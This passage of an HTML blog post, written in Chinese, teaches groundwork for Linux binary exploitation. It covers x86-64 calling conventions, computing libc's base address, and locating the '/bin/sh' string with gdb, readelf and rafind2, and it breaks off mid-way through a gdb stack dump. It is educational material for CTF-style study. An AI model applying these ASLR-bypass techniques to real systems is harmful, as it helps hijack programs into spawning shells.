@@ -1,0 +1,1535 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Tianji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Tianji">
+    <meta name="keywords" content="pwn前置知识 | Tianji">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>pwn前置知识 · Tianji&#39;s Blog</title>
+    <!-- 设置密码 -->
+    <script>
+        (function(){
+            if(''){
+                if (prompt('请输入文章密码','') !== ''){
+                    alert('密码错误！');
+                    history.back();
+                }
+            }
+        })();
+    </script>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Tianji&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">pwn前置知识</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Tianji's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="height:50vh;">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            pwn前置知识
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">4,062</span> / Reading time: <span class="post-count">24 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/06/08</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;">
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h2><p>32位和64位程序的区别, 更多的是体现在<a href="https://en.wikipedia.org/wiki/X86_calling_conventions" rel="external nofollow" target="_blank">调用约定(Calling Convention)</a>上. 因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递 而不是通过栈, 来获得更高的运行速度.</p>
+<p>本文主要是介绍Linux平台下的漏洞利用, 所以就专注于<code>System V AMD64 ABI</code> 的调用约定, 即函数参数从左到右依次用寄存器RDI,RSI,RDX,RCX,R8,R9来进行传递, 如果参数个数多于6个, 再通过栈来进行传递.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ cat victim.c</span><br><span class="line">int foo(int a, int b, int c,  int d,  int e,  int f,  int g,  int h) &#123;</span><br><span class="line">    return a + b + c + d + e + f + g + h;</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">    foo(1, 2, 3, 4, 5, 6, 7, 8);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc victim.c -o victim</span><br><span class="line">$ objdump -d victim | grep &quot;&lt;main&gt;:&quot; -A 11</span><br><span class="line">00000000000006a0 &lt;main&gt;:</span><br><span class="line"> 6a0:   55                      push   rbp</span><br><span class="line"> 6a1:   48 89 e5                mov    rbp,rsp</span><br><span class="line"> 6a4:   6a 08                   push   0x8</span><br><span class="line"> 6a6:   6a 07                   push   0x7</span><br><span class="line"> 6a8:   41 b9 06 00 00 00       mov    r9d,0x6</span><br><span class="line"> 6ae:   41 b8 05 00 00 00       mov    r8d,0x5</span><br><span class="line"> 6b4:   b9 04 00 00 00          mov    ecx,0x4</span><br><span class="line"> 6b9:   ba 03 00 00 00          mov    edx,0x3</span><br><span class="line"> 6be:   be 02 00 00 00          mov    esi,0x2</span><br><span class="line"> 6c3:   bf 01 00 00 00          mov    edi,0x1</span><br><span class="line"> 6c8:   e8 93 ff ff ff          call   660 &lt;foo&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="查找libc基地址"><a href="#查找libc基地址" class="headerlink" title="查找libc基地址"></a>查找libc基地址</h2><p>方法一:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ LD_TRACE_LOADED_OBJECTS=1 ./vuln</span><br><span class="line">	linux-vdso.so.1 (0x00007ffff7ffa000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e4000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd5000)</span><br></pre></td></tr></table></figure>
+<p>方法二:</p>
+<p>首先查找libc中某一函数的偏移，以system为例:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system@</span><br><span class="line">   607: 000000000004f440    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE</span><br><span class="line">  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5</span><br></pre></td></tr></table></figure>
+<p>或者使用ida也可以查找函数的偏移。</p>
+<p>寻找system的绝对地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln</span><br><span class="line">Catchpoint 1 (exec)</span><br><span class="line">Reading symbols from vuln...done.</span><br><span class="line">gdb-peda$ p system</span><br><span class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x5d0 &lt;system@plt&gt;</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln </span><br><span class="line">asdf</span><br><span class="line">asdf</span><br><span class="line"></span><br><span class="line">[Inferior 1 (process 7107) exited normally]</span><br><span class="line">Warning: not running or target is remote</span><br><span class="line">gdb-peda$ p system</span><br><span class="line">$2 = &#123;int (const char *)&#125; 0x7ffff7a33440 &lt;__libc_system&gt;</span><br></pre></td></tr></table></figure>
+<p>然后就可以计算libc的基地址:</p>
+<blockquote>
+<p> 0x7ffff7a33440 - 0x4f440 = 0x7ffff79e4000</p>
+</blockquote>
+<h2 id="查找”-bin-sh”的偏移地址"><a href="#查找”-bin-sh”的偏移地址" class="headerlink" title="查找”/bin/sh”的偏移地址"></a>查找”/bin/sh”的偏移地址</h2><p>方法一:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -z -s /bin/sh /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x1b3e9a</span><br></pre></td></tr></table></figure>
+<p>方法二:</p>
+<p>在ida中查找。</p>
+<p>方法三:</p>
+<p>在环境变量中查找。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln</span><br><span class="line">Catchpoint 1 (exec)</span><br><span class="line">Reading symbols from vuln...done.</span><br><span class="line"><span class="meta">gdb-peda$</span> b *main</span><br><span class="line">Breakpoint 2 at 0x555555554739: file vuln.c, line 17.</span><br><span class="line"><span class="meta">gdb-peda$</span> r</span><br><span class="line">Starting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln </span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x555555554739 (&lt;main&gt;:	push   rbp)</span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x555555554790 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">RDX: 0x7fffffffddf8 --&gt; 0x7fffffffe1c7 ("CLUTTER_IM_MODULE=xim")</span><br><span class="line">RSI: 0x7fffffffdde8 --&gt; 0x7fffffffe199 ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")</span><br><span class="line">RDI: 0x1 </span><br><span class="line">RBP: 0x555555554790 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">RSP: 0x7fffffffdd08 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:	mov    edi,eax)</span><br><span class="line">RIP: 0x555555554739 (&lt;main&gt;:	push   rbp)</span><br><span class="line">R8 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R9 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R10: 0x0 </span><br><span class="line">R11: 0x1 </span><br><span class="line">R12: 0x555555554610 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffdde0 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x55555555472a &lt;shell+16&gt;:	call   0x5555555545d0 &lt;system@plt&gt;</span><br><span class="line">   0x55555555472f &lt;shell+21&gt;:	mov    edi,0x0</span><br><span class="line">   0x555555554734 &lt;shell+26&gt;:	call   0x5555555545f0 &lt;exit@plt&gt;</span><br><span class="line">=&gt; 0x555555554739 &lt;main&gt;:	push   rbp</span><br><span class="line">   0x55555555473a &lt;main+1&gt;:	mov    rbp,rsp</span><br><span class="line">   0x55555555473d &lt;main+4&gt;:	sub    rsp,0x120</span><br><span class="line">   0x555555554744 &lt;main+11&gt;:	mov    DWORD PTR [rbp-0x114],edi</span><br><span class="line">   0x55555555474a &lt;main+17&gt;:	mov    QWORD PTR [rbp-0x120],rsi</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdd08 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:	mov    edi,eax)</span><br><span class="line">0008| 0x7fffffffdd10 --&gt; 0x1 </span><br><span class="line">0016| 0x7fffffffdd18 --&gt; 0x7fffffffdde8 --&gt; 0x7fffffffe199 ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")</span><br><span class="line">0024| 0x7fffffffdd20 --&gt; 0x100008000 </span><br><span class="line">0032| 0x7fffffffdd28 --&gt; 0x555555554739 (&lt;main&gt;:	push   rbp)</span><br><span class="line">0040| 0x7fffffffdd30 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffdd38 --&gt; 0xbd88a50cb0fd83be </span><br><span class="line">0056| 0x7fffffffdd40 --&gt; 0x555555554610 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17</span><br><span class="line">warning: Source file is more recent than executable.</span><br><span class="line">17	int main(int argc, char* argv[]) &#123;</span><br><span class="line"><span class="meta">gdb-peda$</span> telescope 100</span><br><span class="line">0000| 0x7fffffffdd08 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:	mov    edi,eax)</span><br><span class="line">0008| 0x7fffffffdd10 --&gt; 0x1 </span><br><span class="line">0016| 0x7fffffffdd18 --&gt; 0x7fffffffdde8 --&gt; 0x7fffffffe199 ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")</span><br><span class="line">0024| 0x7fffffffdd20 --&gt; 0x100008000 </span><br><span class="line">0032| 0x7fffffffdd28 --&gt; 0x555555554739 (&lt;main&gt;:	push   rbp)</span><br><span class="line">0040| 0x7fffffffdd30 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffdd38 --&gt; 0xbd88a50cb0fd83be </span><br><span class="line">0056| 0x7fffffffdd40 --&gt; 0x555555554610 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">0064| 0x7fffffffdd48 --&gt; 0x7fffffffdde0 --&gt; 0x1 </span><br><span class="line">0072| 0x7fffffffdd50 --&gt; 0x0 </span><br><span class="line">0080| 0x7fffffffdd58 --&gt; 0x0 </span><br><span class="line">0088| 0x7fffffffdd60 --&gt; 0xe8ddf05985fd83be </span><br><span class="line">0096| 0x7fffffffdd68 --&gt; 0xe8dde0e6894383be </span><br><span class="line">0104| 0x7fffffffdd70 --&gt; 0x7fff00000000 </span><br><span class="line">0112| 0x7fffffffdd78 --&gt; 0x0 </span><br><span class="line">0120| 0x7fffffffdd80 --&gt; 0x0 </span><br><span class="line">0128| 0x7fffffffdd88 --&gt; 0x7ffff7de5733 (&lt;_dl_init+259&gt;:	add    r14,0x8)</span><br><span class="line">0136| 0x7fffffffdd90 --&gt; 0x7ffff7dcb638 --&gt; 0x7ffff7b7de10 --&gt; 0x8348535554415541 </span><br><span class="line">0144| 0x7fffffffdd98 --&gt; 0x2225ab63 </span><br><span class="line">0152| 0x7fffffffdda0 --&gt; 0x0 </span><br><span class="line">0160| 0x7fffffffdda8 --&gt; 0x0 </span><br><span class="line">0168| 0x7fffffffddb0 --&gt; 0x0 </span><br><span class="line">0176| 0x7fffffffddb8 --&gt; 0x555555554610 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">0184| 0x7fffffffddc0 --&gt; 0x7fffffffdde0 --&gt; 0x1 </span><br><span class="line">0192| 0x7fffffffddc8 --&gt; 0x55555555463a (&lt;_start+42&gt;:	hlt)</span><br><span class="line">--More--(25/100)</span><br><span class="line">0200| 0x7fffffffddd0 --&gt; 0x7fffffffddd8 --&gt; 0x1c </span><br><span class="line">0208| 0x7fffffffddd8 --&gt; 0x1c </span><br><span class="line">0216| 0x7fffffffdde0 --&gt; 0x1 </span><br><span class="line">0224| 0x7fffffffdde8 --&gt; 0x7fffffffe199 ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")</span><br><span class="line">0232| 0x7fffffffddf0 --&gt; 0x0 </span><br><span class="line">0240| 0x7fffffffddf8 --&gt; 0x7fffffffe1c7 ("CLUTTER_IM_MODULE=xim")</span><br><span class="line">0248| 0x7fffffffde00 --&gt; 0x7fffffffe1dd ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)</span><br><span class="line">0256| 0x7fffffffde08 --&gt; 0x7fffffffe7c9 ("LC_MEASUREMENT=zh_CN.UTF-8")</span><br><span class="line">0264| 0x7fffffffde10 --&gt; 0x7fffffffe7e4 ("LESSCLOSE=/usr/bin/lesspipe %s %s")</span><br><span class="line">0272| 0x7fffffffde18 --&gt; 0x7fffffffe806 ("LC_PAPER=zh_CN.UTF-8")</span><br><span class="line">0280| 0x7fffffffde20 --&gt; 0x7fffffffe81b ("LC_MONETARY=zh_CN.UTF-8")</span><br><span class="line">0288| 0x7fffffffde28 --&gt; 0x7fffffffe833 ("XDG_MENU_PREFIX=gnome-")</span><br><span class="line">0296| 0x7fffffffde30 --&gt; 0x7fffffffe84a ("_=/usr/bin/gdb")</span><br><span class="line">0304| 0x7fffffffde38 --&gt; 0x7fffffffe859 ("LANG=en_US.UTF-8")</span><br><span class="line">0312| 0x7fffffffde40 --&gt; 0x7fffffffe86a ("DISPLAY=:0")</span><br><span class="line">0320| 0x7fffffffde48 --&gt; 0x7fffffffe875 ("OLDPWD=/home/tianji/Desktop/sploit")</span><br><span class="line">0328| 0x7fffffffde50 --&gt; 0x7fffffffe898 ("GNOME_SHELL_SESSION_MODE=ubuntu")</span><br><span class="line">0336| 0x7fffffffde58 --&gt; 0x7fffffffe8b8 ("COLORTERM=truecolor")</span><br><span class="line">0344| 0x7fffffffde60 --&gt; 0x7fffffffe8cc ("USERNAME=tianji")</span><br><span class="line">0352| 0x7fffffffde68 --&gt; 0x7fffffffe8dc ("XDG_VTNR=1")</span><br><span class="line">0360| 0x7fffffffde70 --&gt; 0x7fffffffe8e7 ("SSH_AUTH_SOCK=/run/user/1000/keyring/ssh")</span><br><span class="line">0368| 0x7fffffffde78 --&gt; 0x7fffffffe910 ("MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path")</span><br><span class="line">0376| 0x7fffffffde80 --&gt; 0x7fffffffe946 ("LC_NAME=zh_CN.UTF-8")</span><br><span class="line">0384| 0x7fffffffde88 --&gt; 0x7fffffffe95a ("XDG_SESSION_ID=1")</span><br><span class="line">0392| 0x7fffffffde90 --&gt; 0x7fffffffe96b ("USER=tianji")</span><br><span 